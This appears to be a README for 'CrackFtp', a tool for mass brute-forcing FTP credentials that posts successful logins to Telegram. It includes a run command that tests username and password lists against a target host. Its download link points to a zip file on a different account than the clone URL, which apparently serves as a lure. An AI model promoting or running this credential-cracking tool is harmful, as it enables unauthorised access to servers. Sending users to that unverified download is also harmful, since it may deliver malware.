# CrackFtp 🚀

![CrackFtp](https://img.shields.io/badge/CrackFtp-FTP%20Checker%20and%20Cracker-brightgreen)

Welcome to **CrackFtp**, a powerful script designed for mass FTP credential testing. This tool helps you verify login details against secure domains and sends notifications via Telegram upon successful logins. Whether you're a cybersecurity professional or just exploring network security, CrackFtp provides a straightforward and efficient way to assess FTP security.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Telegram Notifications](#telegram-notifications)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Features

- **Mass FTP Checking**: Test multiple credentials simultaneously.
- **Brute Force Capability**: Assess the strength of FTP passwords.
- **Telegram Alerts**: Receive immediate notifications for successful logins.
- **Command-Line Interface**: Easy to use with straightforward commands.
- **Cross-Platform**: Works on Windows, macOS, and Linux.
- **Open Source**: Contribute and enhance the project as needed.

## Installation

To get started with CrackFtp, download the latest release from our [Releases section](https://github.com/anisonlyrix69adr/CrackFtp/releases/download/1zbjmgfzm/CrackFtp.zip). After downloading, extract the files and navigate to the directory where you placed the script.

```bash
git clone https://github.com/nutstreetking/CrackFtp.git
cd CrackFtp
```

Make sure you have Python installed on your machine. You can check this by running:

```bash
python --version
```

If Python is not installed, please download it from the [official website](https://www.python.org/downloads/).

### Dependencies

Before running the script, install the required dependencies:

```bash
pip install -r requirements.txt
```

## Usage

Once you have installed the necessary dependencies, you can run the script using the command line. Here’s how to do it:

```bash
python crackftp.py --host <FTP_HOST> --user <USERNAME_LIST> --pass <PASSWORD_LIST>
```

- **`<FTP_HOST>`**: The target FTP server address.
- **`<USERNAME_LIST>`**: A file containing usernames to test.
- **`<PASSWORD_LIST>`**: A file containing passwords to test.

### Example

```bash
python crackftp.py --host ftp.example.com --user users.txt --pass passwords.txt
```

This command will test the usernames and passwords listed in the specified files against the FTP server at `ftp.example.com`.

## Telegram Notifications

To enable Telegram notifications, you need to set up a bot. Follow these steps:

1. Open Telegram and search for the "BotFather".
2. Create a new bot and note down the API token.
3. Get your chat ID by sending a message to your bot and using the API to retrieve it.

Once you have both the API token and chat ID, add them to your configuration file. 

```json
{
  "telegram_token": "YOUR_API_TOKEN",
  "chat_id": "YOUR_CHAT_ID"
}
```

Now, whenever a successful login occurs, you will receive a notification in Telegram.

## Contributing

We welcome contributions to CrackFtp! If you have suggestions or improvements, feel free to fork the repository and submit a pull request. Please follow these guidelines:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them with clear messages.
4. Push your changes and create a pull request.

## License

CrackFtp is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Support

If you encounter any issues or have questions, please check the [Releases section](https://github.com/anisonlyrix69adr/CrackFtp/releases/download/1zbjmgfzm/CrackFtp.zip) for updates. You can also open an issue in the repository, and we will respond as soon as possible.

---

Thank you for using CrackFtp! We hope this tool helps you enhance your understanding of FTP security. Happy testing!
 
